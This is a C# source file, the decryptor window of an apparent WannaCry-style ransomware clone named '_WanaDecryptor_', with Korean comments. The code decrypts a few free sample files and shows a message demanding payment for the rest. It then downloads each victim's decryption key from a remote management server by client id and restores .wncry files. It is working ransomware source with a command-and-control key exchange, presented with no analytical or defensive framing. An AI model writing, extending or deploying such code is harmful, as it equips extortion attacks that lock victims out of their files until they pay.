using _WanaDecryptor_.Utils.Crypto;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace _WanaDecryptor_
{
    /// <summary>
    /// Decrypt.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class Decrypt : Window
    {
        // 복호화 여부 결정 변수
        private bool isDecryptChecker;
        // 복호화 결과
        private StringBuilder stringBuilder = new StringBuilder();
        private ObservableCollection<string> observableCollection = new ObservableCollection<string>();




        /// <summary>
        /// 생성자
        /// </summary>
        /// <param name="isDecryptChecker"></param>
        public Decrypt(bool isDecryptChecker)
        {
            InitializeComponent();

            this.isDecryptChecker = isDecryptChecker;
        }



        /// <summary>
        /// 닫기 버튼 클릭 이벤트
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CloseButton_Click(object sender, RoutedEventArgs e)
        {
            this.Close();
        }



        /// <summary>
        /// 복사 버큰 클릭 이벤트
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CopyClipboardButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                Clipboard.SetText(stringBuilder.ToString());
            }
            catch (Exception) { }
        }



        /// <summary>
        /// 복호화 시작 버튼 클릭 이벤트
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void StartButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                // UI 설정
                DecryptLog.ItemsSource = observableCollection;

                await Task.Run(() =>
                {
                    try
                    {
                        freeFileDecrypt();
                    }
                    catch (Exception ex)
                    {
                        // 예외 발생
                        MessageBox.Show(ex.ToString(), "@WanaDecrypt0r@", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                });

                if (!isDecryptChecker)
                {
                    MessageBox.Show("Please confirm your payment to recover the remaining files. Press the 'Check Payment' button to try.", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Information);

                    return;
                }

                // 클라이언트 정보 파일 읽기
                AESManager aESManager = new AESManager();

                // 클라이언트 정보 불러오기
                string clientInfo = null;
                await Task.Run(() =>
                {
                    WebClient webClient = new WebClient();
                    clientInfo = webClient.DownloadString(
                        string.Format(
                            "https://rhya-network.kro.kr/RhyaNetwork/wanacrypt0r_manager?mode=3&clientid={0}",
                            JObject.Parse(aESManager.TextAESDecrypt(File.ReadAllText("b.wnry")))["client_id"]));
                    webClient.Dispose();
                });

                // JSON 파싱
                JObject jObjectForClientInfoNew = JObject.Parse(HttpUtility.UrlDecode(clientInfo));
                string decryptKey = (string)jObjectForClientInfoNew["encrypt_key"];

                // 복호화 대상 경로
                FileStream fs1 = new FileStream("a.wnry", FileMode.Open);
                BinaryFormatter formatter1 = new BinaryFormatter();
                List<string> encryptTarget = (List<string>) formatter1.Deserialize(fs1);
                fs1.Dispose();
                fs1.Close();

                // 파일 복호화
                await Task.Run(() => 
                {
                    try
                    {
                        // 파일 복호화 대상 경로 리스트
                        for (int encryptIndex = 0; encryptIndex < encryptTarget.Count; encryptIndex++)
                        {
                            try
                            {
                                DecryptFile(encryptTarget[encryptIndex], decryptKey);
                            }
                            catch (Exception) { }
                        }
                    }
                    catch (Exception ex)
                    {
                        // 예외 발생
                        MessageBox.Show(ex.ToString(), "@WanaDecrypt0r@", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                });

                MessageBox.Show("File decryption succeeded! Thank you, XD.", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception) { }
        }



        /// <summary>
        /// 파일 복호화 함수
        /// </summary>
        /// <param name="path">복호화 대상 경로</param>
        /// <param name="key">암호화 키</param>
        private void DecryptFile(string path, string key)
        {
            try
            {
                AESManager aESManager = new AESManager();

                // 암호화 대상 파일 리스트
                string[] files = Directory.GetFiles(path);

                // 파일 암호화
                foreach (string file in files)
                {
                    try
                    {
                        System.IO.FileInfo fileInfo = new FileInfo(file);

                        if (fileInfo.Extension.ToLower().CompareTo(".wncry") == 0)
                        {
                            stringBuilder.AppendLine(file);
                            Application.Current.Dispatcher.Invoke(() => 
                            {
                                try
                                {
                                    observableCollection.Add(file);
                                }
                                catch (Exception) { }
                            });

                            aESManager.FileAESDecrypt(file, file.Replace(".wncry", ""), key);

                            File.Delete(file);
                        }
                    }
                    catch (Exception) { }
                }

                foreach (string dir in Directory.GetDirectories(path))
                    DecryptFile(dir, key);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }



        /// <summary>
        /// 파일 복호화
        /// </summary>
        private void freeFileDecrypt()
        {
            try
            {
                // 무료 파일 복호화 확인
                if (int.Parse(File.ReadAllText("p.wnry")) == 0)
                {
                    // 클라이언트 정보 파일 읽기
                    AESManager aESManager = new AESManager();

                    File.WriteAllText("p.wnry", "1");

                    string freeKey = File.ReadAllText("0000000.xkey");
                    FileStream fs2 = new FileStream("0000000.bin", FileMode.Open);
                    BinaryFormatter formatter2 = new BinaryFormatter();
                    List<string> freeTarget = (List<string>)formatter2.Deserialize(fs2);
                    fs2.Dispose();
                    fs2.Close();
                    try
                    {
                        foreach (string file in freeTarget)
                        {
                            try
                            {
                                stringBuilder.AppendLine(file);
                                Application.Current.Dispatcher.Invoke(() =>
                                {
                                    try
                                    {
                                        observableCollection.Add(file);
                                    }
                                    catch (Exception) { }
                                });

                                aESManager.FileAESDecrypt(file, file.Replace(".wncry", ""), freeKey);

                                File.Delete(file);
                            }
                            catch (Exception ex)
                            {
                                // 예외 발생
                                MessageBox.Show(ex.ToString(), "@WanaDecrypt0r@", MessageBoxButton.OK, MessageBoxImage.Error);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        // 예외 발생
                        MessageBox.Show(ex.ToString(), "@WanaDecrypt0r@", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }
    }
}
